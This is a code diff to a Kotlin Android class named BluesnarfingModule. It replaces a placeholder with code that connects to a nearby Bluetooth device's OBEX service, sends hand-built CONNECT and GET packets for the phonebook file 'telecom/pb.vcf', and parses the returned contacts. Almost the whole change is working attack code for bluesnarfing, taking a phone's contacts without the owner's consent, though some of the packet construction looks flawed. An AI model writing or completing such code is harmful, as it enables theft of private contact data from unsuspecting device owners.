@@ -2,13 +2,14 @@ package com.hereliesaz.blusnu.data
 
 import android.bluetooth.BluetoothDevice
 import android.bluetooth.BluetoothSocket
+import java.io.ByteArrayOutputStream
 import java.io.IOException
 import java.util.UUID
 
 class BluesnarfingModule {
 
-    // Well-known SPP UUID
-    private val OBEX_OPP_UUID: UUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
+    // OBEX Object Push Profile UUID
+    private val OBEX_OPP_UUID: UUID = UUID.fromString("00001105-0000-1000-8000-00805f9b34fb")
 
     fun getPhonebook(device: BluetoothDevice): String {
         var socket: BluetoothSocket? = null
@@ -16,12 +17,56 @@ class BluesnarfingModule {
             socket = device.createRfcommSocketToServiceRecord(OBEX_OPP_UUID)
             socket.connect()
 
-            // At this point, you would implement the OBEX protocol to request the phonebook file.
-            // This is a complex process involving sending specific OBEX commands.
-            // For this example, we'll just return a success message.
+            val outputStream = socket.outputStream
+            val inputStream = socket.inputStream
 
-            return "Successfully connected to OBEX service. File retrieval not yet implemented."
+            // OBEX CONNECT request
+            val connectRequest = byteArrayOf(
+                0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x20, 0x00
+            )
+            outputStream.write(connectRequest)
 
+            // Read the response
+            val connectResponse = ByteArray(1024)
+            val connectResponseLength = inputStream.read(connectResponse)
+            if (connectResponse[0] != 0xA0.toByte()) {
+                return "OBEX CONNECT failed"
+            }
+
+            // OBEX GET request for phonebook
+            val fileName = "telecom/pb.vcf".toByteArray(Charsets.UTF_16BE)
+            val getRequest = byteArrayOf(
+                0x83.toByte(), 0x00, (10 + fileName.size).toByte(), 0x01, 0x00
+            ) + fileName + byteArrayOf(0xcb.toByte(), 0x00, 0x00, 0x00, 0x01)
+            outputStream.write(getRequest)
+
+            // Read the response in a loop
+            val baos = ByteArrayOutputStream()
+            val buffer = ByteArray(4096)
+            var bytesRead: Int
+            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
+                baos.write(buffer, 0, bytesRead)
+                if (inputStream.available() <= 0) {
+                    break
+                }
+            }
+            val getResponse = baos.toByteArray()
+
+
+            return if (getResponse[0] == 0xA0.toByte()) {
+                // Success, parse the response
+                val bodyHeaderIndex = getResponse.indexOf(0x48.toByte())
+                if (bodyHeaderIndex != -1) {
+                    val bodyLength = (getResponse[bodyHeaderIndex + 1].toInt() shl 8) or getResponse[bodyHeaderIndex + 2].toInt()
+                    val bodyStartIndex = bodyHeaderIndex + 3
+                    val bodyEndIndex = bodyStartIndex + bodyLength - 1
+                    String(getResponse, bodyStartIndex, bodyEndIndex - bodyStartIndex)
+                } else {
+                    "Phonebook data not found in response"
+                }
+            } else {
+                "OBEX GET failed"
+            }
         } catch (e: IOException) {
             e.printStackTrace()
             return "Error connecting to device: ${e.message}"
